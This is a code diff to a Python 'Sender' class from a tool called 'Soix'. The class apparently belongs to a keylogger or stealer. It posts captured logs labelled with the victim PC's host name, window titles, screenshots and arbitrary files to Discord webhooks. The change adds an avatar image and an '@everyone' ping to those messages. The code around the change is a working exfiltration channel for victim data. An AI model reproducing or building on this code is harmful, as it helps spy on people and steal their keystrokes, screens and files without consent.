@@ -10,7 +10,9 @@ class Sender:
 
 	def send_info(self):
 		payload = {"username":"Soix",
+					"avatar_url":"https://i.ibb.co/1GLSqbb/logo.png",
 					"tts":False,
+					"content":"@everyone",
 					"embeds":[{
 						"id":747655115,
 						"type": "rich",
@@ -31,6 +33,7 @@ class Sender:
 	def send(self, log = '', window = None, image_path = None):
 		log = f'```\n{log}\n```' if log != '' else '```None```'
 		payload = {"username":"Soix",
+					"avatar_url":"https://i.ibb.co/1GLSqbb/logo.png",
 					"content":f"**New Log From {pc.HostName()}**",
 					"tts":False,
 					"embeds":[{
@@ -47,13 +50,13 @@ class Sender:
 								}
 							}]
 					}
-		files = {'payload_json': (None, '{"username":"Soix", "content": ""}'),
+		files = {'payload_json': (None, '{"username":"Soix", "content": "", "avatar_url":"https://i.ibb.co/1GLSqbb/logo.png"}'),
 				'media': open(image_path, 'rb')} if image_path != None else None
 		requests.post(self.webhook_log_url, json = payload)
 		requests.post(self.webhook_log_url, files=files) if files != None else None
 
 	def send_file(self, file_path, msg = None):
 		msg = "**File Sender**" if msg == None else msg
-		files = {'payload_json': (None, '{"username":"Soix", "content": "'+ msg +'"}'),
+		files = {'payload_json': (None, '{"username":"Soix", "content": "'+ msg +'", "avatar_url":"https://i.ibb.co/1GLSqbb/logo.png"}'),
 				"media": open(file_path, 'rb')}
 		requests.post(self.webhook_info_url, files=files)
